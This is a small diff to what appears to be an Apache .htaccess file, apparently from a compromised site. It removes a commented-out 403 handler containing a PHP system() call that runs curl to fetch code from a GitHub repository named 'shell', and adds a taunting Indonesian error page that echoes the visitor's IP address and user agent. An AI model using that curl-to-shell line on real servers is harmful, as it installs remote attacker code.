@@ -30,4 +30,4 @@ Options All -Indexes
 ServerSignature Off
 
 #custom 403 error message
-#ErrorDocument 403 '<? system('curl https://raw.githubusercontent.com/beatkarbu199/shell/refs/heads/main/tesSC');'
+#ErrorDocument 403 '<h1 align="center">CIE NYARI SHELL?? <br> PALA BAPAK KAU : %{REMOTE_ADDR} <br> UA : %{HTTP_USER_AGENT}</h1>'
